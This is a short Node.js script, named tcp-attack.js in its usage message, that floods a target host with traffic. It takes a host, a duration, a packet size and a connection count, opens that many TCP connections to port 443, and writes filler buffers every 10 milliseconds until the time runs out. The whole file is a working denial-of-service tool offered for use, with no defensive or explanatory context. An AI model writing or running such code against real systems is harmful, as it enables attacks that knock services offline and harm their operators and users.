const net = require('net');
const [,, host, time, packetSize, threads] = process.argv;

if (!host || isNaN(time) || isNaN(packetSize) || isNaN(threads)) {
  console.error('Usage: node tcp-attack.js <host> <time> <packetSize> <threads>');
  process.exit(1);
}

const duration = parseInt(time, 10) * 1000;
const size = parseInt(packetSize, 10);
const numThreads = parseInt(threads, 10);

function createTCPAttack() {
  const client = new net.Socket();
  
  client.connect(443, host, () => {
    console.log(`Connected to ${host} on port 443`);
    const interval = setInterval(() => {
      const data = Buffer.alloc(size, 'X');
      client.write(data);
    }, 10);

    setTimeout(() => {
      clearInterval(interval);
      client.end();
    }, duration);
  });

  client.on('error', (err) => {
    console.error(`Error: ${err.message}`);
  });

  client.on('close', () => {
    console.log('Connection closed');
  });
}

for (let i = 0; i < numThreads; i++) {
  createTCPAttack();
}
